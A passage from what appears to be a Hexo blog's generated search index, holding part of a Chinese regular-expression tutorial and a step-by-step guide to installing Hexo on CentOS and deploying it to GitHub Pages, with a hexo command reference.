+<p>正则在线测试网站：<a href="https://regexr-cn.com/">https://regexr-cn.com</a></p>
+<p>正则练习平台：<a href="https://www.codejiaonang.com/#/course/regex_chapter1/0/0">https://www.codejiaonang.com/#/course/regex_chapter1/0/0</a></p>
+</blockquote>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124154750051.png" alt="image-20220124154750051"></p>
+<h3 id="字符集：匹配集合中的任何字符"><a href="#字符集：匹配集合中的任何字符" class="headerlink" title="[]字符集：匹配集合中的任何字符"></a><code>[]</code>字符集：匹配集合中的任何字符</h3><ul>
+<li><p><code>-</code>表示区间，例如：<code>[a-z]</code>表示小写字母a到z</p>
+</li>
+<li><p><code>\</code>转义特殊字符，<code>[\]]</code>表示匹配<code>]</code></p>
+</li>
+<li><p><code>^</code>表示取非，<code>[^]</code>称作非集，匹配不在集合中的任何字符，例如<code>我[^你]</code>匹配我字后面没有你字（匹配两个字）</p>
+</li>
+</ul>
+<h3 id="快捷方式"><a href="#快捷方式" class="headerlink" title="快捷方式"></a>快捷方式</h3><p><code>\d</code>数字，匹配任意数字(0-9)</p>
+<p><code>\w</code>单词，匹配字母、数字、下划线</p>
+<p><code>\s</code>空白字符，匹配任何空白字符。(空格，制表符tab，换行符)</p>
+<p><code>\b</code>词边界，匹配一个单词边界，也就是指单词和空格见的位置，成对使用，例如<code>\bawesome\b</code>，匹配完整的单词，前后不能有其他字母，否则将匹配失败</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125125138035.png" alt="image-20220125125138035"></p>
+<p>快捷方式取非，将上述<code>dwsb</code>等字母，换成大写即可</p>
+<h3 id="开头和结尾"><a href="#开头和结尾" class="headerlink" title="开头和结尾"></a>开头和结尾</h3><p><code>^</code>开头，匹配字符串开头，或者当使用多行标志时，匹配一行的开头</p>
+<p><code>$</code>结尾，匹配字符串结尾，或者当使用多行标志时，匹配一行的结尾</p>
+<p>例如<code>^abcd</code>会匹配<code>abcdefg</code>中的<code>abcd</code>，<code>efg$</code>会匹配<code>abcdefg</code>中的<code>efg</code></p>
+<h3 id="任意字符"><a href="#任意字符" class="headerlink" title="任意字符"></a>任意字符</h3><p><code>.</code>，匹配任何字符(不包括换行)</p>
+<h3 id="量词"><a href="#量词" class="headerlink" title="量词"></a>量词</h3><p><code>?</code>，匹配在0和1之间个前面的标记，例如<code>favou?r</code>，匹配的时favour和favor</p>
+<p><code>&#123;n&#125;</code>，匹配n个前面的标记，例如<code>\d&#123;10&#125;</code>，匹配连续10个数字</p>
+<p><code>&#123;n,m&#125;</code><strong>贪婪模式</strong>，匹配n到m个前面的标记，有连续的m个就会匹配m个</p>
+<p><code>&#123;n,m&#125;?</code><strong>非贪婪模式</strong>，只会匹配到连续的n个就停止匹配，例如下图</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220124234228787.png" alt="image-20220124234228787"></p>
+<p><code>*</code>，匹配0个或更多个前面的标记，例如<code>f.*</code>，会匹配所有f开头的字符</p>
+<p><code>+</code>，匹配1个或更多个前面的标记，例如<code>f.+</code>，会匹配所有f开头的字符，但不匹配单独的f</p>
+<h3 id="分组提取"><a href="#分组提取" class="headerlink" title="分组提取"></a>分组提取</h3><p><code>()</code>捕获分组，把多个标记分在同一组并创建一个捕获分组，用来创建子串或引用</p>
+<p><code>|</code>或者条件</p>
+<p><code>(?:表达式)</code>非捕获分组，在不创建捕获分组的情况下，把数个标记组在一起</p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125164458925.png" alt="image-20220125164458925"></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125173535988.png" alt="image-20220125173535988"></p>
+<p><code>(表达式)\1</code>分组的回溯引用，<code>\1</code>的效果是重新使用第1个分组去匹配，例如<code>(\w)(\w)\2\1</code>，匹配abba这种类型的字符，<strong>注：只有<code>()</code>有效，<code>(?:)</code>等无效</strong></p>
+<h3 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h3><p>可以理解为预搜索，可对字符串做限制要求</p>
+<h4 id="先行（表示从某个位置向右看）"><a href="#先行（表示从某个位置向右看）" class="headerlink" title="先行（表示从某个位置向右看）"></a>先行（表示从某个位置向右看）</h4><p><code>(?=)</code><strong>正向</strong>先行断言，匹配主表达式后面的组而不将其包含在结果中（保证右边含有某字符）</p>
+<p><strong>可以翻译为：(?=表达式)右边存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125175109411.png" alt="image-20220125175109411"></p>
+<p><code>(?!)</code><strong>反向</strong>先行断言,指定著表达式后无法匹配的组，若匹配结果将被丢弃（保证右边不出现某字符）</p>
+<p><strong>可以翻译为：(?!表达式)右边不存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181138445.png" alt="image-20220125181138445"></p>
+<p>tips：正向是<code>=</code>，反向是<code>!</code>，也即正向是<strong>有</strong>，反向是<strong>没有</strong></p>
+<h4 id="后行-表示从某个位置向左看"><a href="#后行-表示从某个位置向左看" class="headerlink" title="后行(表示从某个位置向左看)"></a>后行(表示从某个位置向左看)</h4><p><code>(?&lt;=)</code><strong>正向</strong>后行断言，匹配主表达式之前的组，而不将其包含在结果中</p>
+<p><strong>可以翻译为：(?&lt;=表达式)左边存在</strong></p>
+<p><code>(?&lt;!)</code><strong>反向</strong>后行断言，指定在主表达式之前无法匹配的组，如果匹配，则结果将被丢弃</p>
+<p><strong>可以翻译为：(?&lt;!表达式)左边不存在</strong></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125181836600.png" alt="image-20220125181836600"></p>
+<p><img src="/2022/01/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20220125183732972.png" alt="image-20220125183732972"></p>
+]]></content>
+      <tags>
+        <tag>正则表达式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建部署博客</title>
+    <url>/2021/01/29/%E6%90%AD%E5%BB%BA%E9%83%A8%E7%BD%B2%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>环境：CentOS8.1</p>
+<p>配置：nodejs、cnpm、git、hexo</p>
+<p>注意：配置时需要root权限，所以登录root用户</p>
+<span id="more"></span>
+<h2 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h2><p>安装：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum -y install nodejs</span><br></pre></td></tr></table></figure>
+
+<p>测试安装是否成功：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# node -v</span><br><span class="line">v10.21.0</span><br><span class="line">[root@localhost ~]# npm -v</span><br><span class="line">6.14.4</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示版本即可</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="安装cnpm"><a href="#安装cnpm" class="headerlink" title="安装cnpm"></a>安装cnpm</h2><p>安装：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>
+
+<p>测试安装是否成功：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cnpm -v</span><br><span class="line">cnpm@6.1.1 (/usr/local/lib/node_modules/cnpm/lib/parse_argv.js)</span><br><span class="line">npm@6.14.11 (/usr/local/lib/node_modules/cnpm/node_modules/npm/lib/npm.js)</span><br><span class="line">node@10.21.0 (/usr/bin/node)</span><br><span class="line">npminstall@3.28.0 (/usr/local/lib/node_modules/cnpm/node_modules/npminstall/lib/index.js)</span><br><span class="line">prefix=/usr/local </span><br><span class="line">linux x64 4.18.0-147.el8.x86_64</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 有上述信息即可</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>安装：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cnpm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+
+<p>测试安装是否成功：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# hexo -v</span><br><span class="line">hexo-cli: 4.2.0</span><br><span class="line">os: Linux 4.18.0-147.el8.x86_64 linux x64</span><br><span class="line">http_parser: 2.9.3</span><br><span class="line">node: 10.21.0</span><br><span class="line">v8: 6.8.275.32-node.56</span><br><span class="line">uv: 1.34.2</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.7</span><br><span class="line">ares: 1.15.0</span><br><span class="line">modules: 64</span><br><span class="line">nghttp2: 1.41.0</span><br><span class="line">napi: 6</span><br><span class="line">openssl: 1.1.1c</span><br><span class="line">icu: 64.2</span><br><span class="line">unicode: 12.1</span><br><span class="line">cldr: 35.1</span><br><span class="line">tz: 2019c</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 有上述信息即可</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="初始化博客目录"><a href="#初始化博客目录" class="headerlink" title="初始化博客目录"></a>初始化博客目录</h2><p>创建blog目录：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--查看当前路径</span><br><span class="line">[root@localhost ~]# pwd</span><br><span class="line">/root</span><br><span class="line">--在root目录下创建blog目录</span><br><span class="line">[root@localhost ~]# mkdir blog</span><br><span class="line">--进入blog目录</span><br><span class="line">[root@localhost ~]# cd blog/</span><br><span class="line">[root@localhost blog]# pwd</span><br><span class="line">/root/blog</span><br></pre></td></tr></table></figure>
+
+<p>初始化blog目录：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo init</span><br><span class="line">INFO  Cloning hexo-starter https://github.com/hexojs/hexo-starter.git</span><br><span class="line">WARN  git clone failed. Copying data instead</span><br><span class="line">FATAL &#123; err:</span><br><span class="line">   &#123; Error: ENOENT: no such file or directory, scandir &#x27;/usr/local/lib/node_modules/hexo-cli/assets&#x27;</span><br><span class="line">     errno: -2,</span><br><span class="line">     code: &#x27;ENOENT&#x27;,</span><br><span class="line">     syscall: &#x27;scandir&#x27;,</span><br><span class="line">     path: &#x27;/usr/local/lib/node_modules/hexo-cli/assets&#x27; &#125; &#125; &#x27;Something\&#x27;s wrong. Maybe you can find the solution here: %s&#x27; &#x27;\u001b[4mhttp://hexo.io/docs/troubleshooting.html\u001b[24m&#x27;</span><br><span class="line">[root@localhost blog]# cd blog</span><br><span class="line">bash: cd: blog: 没有那个文件或目录</span><br></pre></td></tr></table></figure>
+
+<p>但出现上述信息</p>
+<p>解决：安装git即可</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# yum -y install git</span><br></pre></td></tr></table></figure>
+
+<p>再进行初始化blog目录操作：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo init</span><br><span class="line">INFO  Cloning hexo-starter https://github.com/hexojs/hexo-starter.git</span><br><span class="line">INFO  Install dependencies</span><br><span class="line">added 188 packages from 443 contributors and audited 194 packages in 34.925s</span><br><span class="line"></span><br><span class="line">15 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br><span class="line"></span><br><span class="line">found 0 vulnerabilities</span><br><span class="line"></span><br><span class="line">INFO  Start blogging with Hexo!</span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示如上信息即可</span></span><br></pre></td></tr></table></figure>
+
+<p>查看现在blog目录内容：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# ls -l</span><br><span class="line">总用量 76</span><br><span class="line">-rw-r--r--.   1 root root     0 1月  27 11:19 _config.landscape.yml</span><br><span class="line">-rw-r--r--.   1 root root  2439 1月  27 11:19 _config.yml</span><br><span class="line">drwxr-xr-x. 165 root root  8192 1月  27 11:20 node_modules</span><br><span class="line">-rw-r--r--.   1 root root   615 1月  27 11:19 package.json</span><br><span class="line">-rw-r--r--.   1 root root 56654 1月  27 11:20 package-lock.json</span><br><span class="line">drwxr-xr-x.   2 root root    52 1月  27 11:19 scaffolds</span><br><span class="line">drwxr-xr-x.   3 root root    20 1月  27 11:19 source</span><br><span class="line">drwxr-xr-x.   2 root root    22 1月  27 11:19 themes</span><br></pre></td></tr></table></figure>
+
+<p>启动博客（在本地<a href="http://localhost:4000端口）">http://localhost:4000端口）</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo s</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure>
+
+<p>（配访问结果图）</p>
+<h2 id="创建一篇新博客"><a href="#创建一篇新博客" class="headerlink" title="创建一篇新博客"></a>创建一篇新博客</h2><p>创建一篇博客：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo n &quot;我的第一篇博客文章&quot;</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Created: ~/blog/source/_posts/我的第一篇博客文章.md</span><br></pre></td></tr></table></figure>
+
+<p>博客存放位置：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# pwd</span><br><span class="line">/root/blog</span><br><span class="line">[root@localhost blog]# ls</span><br><span class="line">_config.landscape.yml  db.json       package.json       scaffolds  themes</span><br><span class="line">_config.yml            node_modules  package-lock.json  source</span><br><span class="line">[root@localhost blog]# cd source/_posts/</span><br><span class="line">[root@localhost _posts]# </span><br><span class="line">[root@localhost _posts]# ls -l</span><br><span class="line">总用量 8</span><br><span class="line">-rw-r--r--. 1 root root  75 1月  27 11:23 我的第一篇博客文章.md</span><br><span class="line">-rw-r--r--. 1 root root 838 1月  27 11:19 hello-world.md</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 博客都存放在<span class="string">&quot;~blog/source/_posts/&quot;</span>路径下</span></span><br></pre></td></tr></table></figure>
+
+<p>编辑博客：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost _posts]# vim 我的第一篇博客文章.md</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用markdown语法进行编辑</span></span><br></pre></td></tr></table></figure>
+
+<p>返回到blog目录下，将新的博客部署到本地：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost _posts]# cd ../..</span><br><span class="line">[root@localhost blog]# pwd</span><br><span class="line">/root/blog</span><br><span class="line">[root@localhost blog]# ls</span><br><span class="line">_config.landscape.yml  db.json       package.json       scaffolds  themes</span><br><span class="line">_config.yml            node_modules  package-lock.json  source</span><br><span class="line">[root@localhost blog]# </span><br><span class="line">[root@localhost blog]# hexo clean</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Deleted database.</span><br><span class="line">[root@localhost blog]# </span><br><span class="line">[root@localhost blog]# hexo g</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Files loaded in 168 ms</span><br><span class="line">INFO  Generated: archives/index.html</span><br><span class="line">INFO  Generated: archives/2021/index.html</span><br><span class="line">INFO  Generated: archives/2021/01/index.html</span><br><span class="line">INFO  Generated: index.html</span><br><span class="line">INFO  Generated: fancybox/jquery.fancybox.min.css</span><br><span class="line">INFO  Generated: js/script.js</span><br><span class="line">INFO  Generated: css/style.css</span><br><span class="line">INFO  Generated: 2021/01/27/我的第一篇博客文章/index.html</span><br><span class="line">INFO  Generated: 2021/01/27/hello-world/index.html</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.woff2</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.woff</span><br><span class="line">INFO  Generated: fancybox/jquery.fancybox.min.js</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.ttf</span><br><span class="line">INFO  Generated: js/jquery-3.4.1.min.js</span><br><span class="line">INFO  Generated: css/fonts/FontAwesome.otf</span><br><span class="line">INFO  Generated: css/images/banner.jpg</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.eot</span><br><span class="line">INFO  Generated: css/fonts/fontawesome-webfont.svg</span><br><span class="line">INFO  18 files generated in 460 ms</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示上述信息即可</span></span><br></pre></td></tr></table></figure>
+
+<p>再次启动并访问：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo s</span><br><span class="line">INFO  Validating config</span><br><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http://localhost:4000 . Press Ctrl+C to stop.</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="将本地博客部署到GitHub上"><a href="#将本地博客部署到GitHub上" class="headerlink" title="将本地博客部署到GitHub上"></a>将本地博客部署到GitHub上</h2><h3 id="GitHub设置"><a href="#GitHub设置" class="headerlink" title="GitHub设置"></a>GitHub设置</h3><p>（配图）</p>
+<p>新建一个仓库 New repository</p>
+<p>Repository name必须是”GitHub昵称.github.io”，我的就是”1ceC0la.github.io”</p>
+<p>Description(optional 可选)：我的hexo博客</p>
+<p>选择Pbulic</p>
+<p>最后点击Create repository</p>
+<h3 id="本地设置"><a href="#本地设置" class="headerlink" title="本地设置"></a>本地设置</h3><p>git部署插件安装指令(须在blog目录下)：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# cnpm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>
+
+<p>修改blog目录下的_config.yml文件：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# vim _config.yml</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改文件底部</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/1ceC0la/1ceC0la.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<h3 id="本地推到GitHub"><a href="#本地推到GitHub" class="headerlink" title="本地推到GitHub"></a>本地推到GitHub</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo d</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 期间需要输出GitHub用户名和密码</span></span><br></pre></td></tr></table></figure>
+
+<p>（配访问图）</p>
+<p>到此整个部署工作完成。</p>
+<h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p>（默认主题换成yilia主题）</p>
+<p>先将目标主题拷贝到本地themes目录下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia</span><br><span class="line">正克隆到 &#x27;themes/yilia&#x27;...</span><br><span class="line">remote: Enumerating objects: 1, done.</span><br><span class="line">remote: Counting objects: 100% (1/1), done.</span><br><span class="line">remote: Total 2037 (delta 0), reused 0 (delta 0), pack-reused 2036</span><br><span class="line">接收对象中: 100% (2037/2037), 10.53 MiB | 55.00 KiB/s, 完成.</span><br><span class="line">处理 delta 中: 100% (1079/1079), 完成.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显示如上信息即可</span></span><br></pre></td></tr></table></figure>
+
+<p>然后修改配置文件_config.yml：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# vim _config.yml</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将theme:landscape改成yilia，如下</span></span><br><span class="line">theme: yilia</span><br></pre></td></tr></table></figure>
+
+<p>完成后生成新的博客</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo clean</span><br><span class="line">[root@localhost blog]# hexo g</span><br></pre></td></tr></table></figure>
+
+<p>再推到GitHub上</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost blog]# hexo d</span><br></pre></td></tr></table></figure>
+
+<p>结束。</p>
+<h2 id="hexo命令"><a href="#hexo命令" class="headerlink" title="hexo命令"></a>hexo命令</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">init</span> [folder]</span><br></pre></td></tr></table></figure>
+
+<p>新建一个网站。如果没有设置 <code>folder</code> ，Hexo 默认在目前的文件夹建立网站。</p>
+<p>This command is a shortcut that runs the following steps:</p>
+<ol>
+<li>Git clone <a href="https://github.com/hexojs/hexo-starter">hexo-starter</a> including <a href="https://github.com/hexojs/hexo-theme-landscape">hexo-theme-landscape</a> into the current directory or a target folder if specified.</li>
+<li>Install dependencies using a package manager: <a href="https://classic.yarnpkg.com/lang/en/">Yarn 1</a>, <a href="https://pnpm.js.org/">pnpm</a> or <a href="https://docs.npmjs.com/cli/install">npm</a>, whichever is installed; if there are more than one installed, the priority is as listed. npm is bundled with <a href="https://hexo.io/docs/#Install-Node-js">Node.js</a> by default.</li>
+</ol>
+<h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> [layout] &lt;<span class="built_in">title</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>新建一篇文章。如果没有设置 <code>layout</code> 的话，默认使用 <a href="https://hexo.io/zh-cn/docs/configuration">_config.yml</a> 中的 <code>default_layout</code> 参数代替。如果标题包含空格的话，请使用引号括起来。</p>
+<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> <span class="string">&quot;post title with whitespace&quot;</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-p</code>, <code>--path</code></td>
+<td align="left">自定义新文章的路径</td>
+</tr>
+<tr>
+<td align="left"><code>-r</code>, <code>--replace</code></td>
+<td align="left">如果存在同名文章，将其替换</td>
+</tr>
+<tr>
+<td align="left"><code>-s</code>, <code>--slug</code></td>
+<td align="left">文章的 Slug，作为新文章的文件名和发布后的 URL</td>
+</tr>
+</tbody></table>
+<p>默认情况下，Hexo 会使用文章的标题来决定文章文件的路径。对于独立页面来说，Hexo 会创建一个以标题为名字的目录，并在目录中放置一个 <code>index.md</code> 文件。你可以使用 <code>--path</code> 参数来覆盖上述行为、自行决定文件的目录：</p>
+<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="type">page</span> --path about/me <span class="string">&quot;About me&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>以上命令会创建一个 <code>source/about/me.md</code> 文件，同时 Front Matter 中的 title 为 <code>&quot;About me&quot;</code></p>
+<p>注意！title 是必须指定的！如果你这么做并不能达到你的目的：</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> page <span class="comment">--path about/me</span></span><br></pre></td></tr></table></figure>
+
+<p>此时 Hexo 会创建 <code>source/_posts/about/me.md</code>，同时 <code>me.md</code> 的 Front Matter 中的 title 为 <code>&quot;page&quot;</code>。这是因为在上述命令中，hexo-cli 将 <code>page</code> 视为指定文章的标题、并采用默认的 <code>layout</code>。</p>
+<h3 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h3><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure>
+
+<p>生成静态文件。</p>
+<table>
+<thead>
+<tr>
+<th align="left">选项</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-d</code>, <code>--deploy</code></td>
+<td align="left">文件生成后立即部署网站</td>
+</tr>
+<tr>
+<td align="left"><code>-w</code>, <code>--watch</code></td>
+<td align="left">监视文件变动</td>
+</tr>
+<tr>
+<td align="left"><code>-b</code>, <code>--bail</code></td>
+<td align="left">生成过程中如果发生任何未处理的异常则抛出异常</td>
+</tr>
+<tr>
+<td align="left"><code>-f</code>, <code>--force</code></td>
+<td align="left">强制重新生成文件 Hexo 引入了差分机制，如果 <code>public</code> 目录存在，那么 <code>hexo g</code> 只会重新生成改动的文件。 使用该参数的效果接近 <code>hexo clean &amp;&amp; hexo generate</code></td>
+</tr>
+<tr>
+<td align="left"><code>-c</code>, <code>--concurrency</code></td>
+<td align="left">最大同时生成文件的数量，默认无限制</td>
+</tr>
+</tbody></table>
+<p>该命令可以简写为</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo g</span><br></pre></td></tr></table></figure>
+
+<h3 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$ hexo publish [layout] <span class="tag">&lt;<span class="name">filename</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发表草稿。</p>
+<h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="keyword">server</span></span><br></pre></td></tr></table></figure>
+
+<p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p>
+<table>
+<thead>
+<tr>
+<th align="left">选项</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-p</code>, <code>--port</code></td>
+<td align="left">重设端口</td>
+</tr>
+<tr>
+<td align="left"><code>-s</code>, <code>--static</code></td>
+<td align="left">只使用静态文件</td>
+</tr>
+<tr>
+<td align="left"><code>-l</code>, <code>--log</code></td>
+<td align="left">启动日记记录，使用覆盖记录格式</td>
+</tr>
+</tbody></table>
+<h3 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>部署网站。</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-g</code>, <code>--generate</code></td>
+<td align="left">部署之前预先生成静态文件</td>
+</tr>
+</tbody></table>
+<p>该命令可以简写为：</p>
+<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo d</span><br></pre></td></tr></table></figure>
+
+<h3 id="render"><a href="#render" class="headerlink" title="render"></a>render</h3><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">$ hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure>
+
+<p>渲染文件。</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-o</code>, <code>--output</code></td>
+<td align="left">设置输出路径</td>
+</tr>
+</tbody></table>
+<h3 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h3><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">$ hexo migrate &lt;<span class="keyword">type</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>从其他博客系统 <a href="https://hexo.io/zh-cn/docs/migration">迁移内容</a>。</p>
+<h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ </span>hexo clean</span><br></pre></td></tr></table></figure>
+
+<p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p>
+<p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p>
+<h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">$ hexo list &lt;<span class="keyword">type</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>列出网站资料。</p>
+<h3 id="version"><a href="#version" class="headerlink" title="version"></a>version</h3><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="built_in">version</span></span><br></pre></td></tr></table></figure>
+
+<p>显示 Hexo 版本。</p>
+<h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><h4 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="comment">--safe</span></span><br></pre></td></tr></table></figure>
+
+<p>在安全模式下，不会载入插件和脚本。当您在安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p>
+<h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="comment">--debug</span></span><br></pre></td></tr></table></figure>
+
